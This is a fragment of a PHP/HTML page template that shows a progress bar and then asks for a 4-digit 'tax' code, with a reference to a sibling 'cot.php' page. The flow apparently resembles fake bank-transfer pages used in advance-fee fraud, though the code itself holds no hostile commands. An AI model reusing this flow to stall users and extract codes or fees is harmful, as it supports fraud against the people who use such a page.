...
<div class="form-head mb-4">
    <h2 class="text-black font-w600 mb-2"><?= $page['code1'] ?> Confirmed</h2>
    <p class="mb-0 text-muted"><?= $page['code2'] ?> verification in progress</p>
</div>
    ...
    <div class="col-xl-6 col-lg-8 mx-auto">
        <div class="card border-0 bg-light shadow-sm mb-4" id="progressSection">
            <div class="card-body text-center py-5">
                ...
                <h3 class="text-primary mb-3"> <?= $page['code1'] ?> Verified</h3>
                <p class="text-muted mb-4">Please wait while we verify your <?= $page['code2'] ?> details</p>

                <div class="loading-progress-container mx-auto" style="max-width: 400px;">
                    <div class="loading-progress-bar" id="loading-progress-bar"></div>
                    <div class="loading-progress-text" id="loading-progress-text">35%</div>
                </div>
            </div>
        </div>
        ...
        <div class="card border-0 shadow-sm" id="verificationForm" style="display: none;">
            <div class="card-body text-center py-4">
                ...
                <h3 class="text-primary mb-3">Enter <?= $page['code2'] ?> Code</h3>
                <p class="text-muted mb-4">Please enter the 4-digit <?= $page['code2'] ?> verification code</p>
            ...
            <div class="card-body border-top">
                <div class="virtual-keypad">
                    <!-- Same keypad structure as cot.php -->
                ...
                <form method="POST" id="verificationFormSubmit">
                    <input type="hidden" name="tax_code" id="finalCode">
                    ...
                    <div class="d-grid gap-2 mt-4">
                        <button type="submit" name="tax_submit" class="btn btn-primary btn-lg py-3" id="submitBtn"
                            disabled>
                            <i class="fas fa-check-circle me-2"></i>Verify <?= $page['code2'] ?> Code
                        </button>
                    </div>
                </form>
            </div>
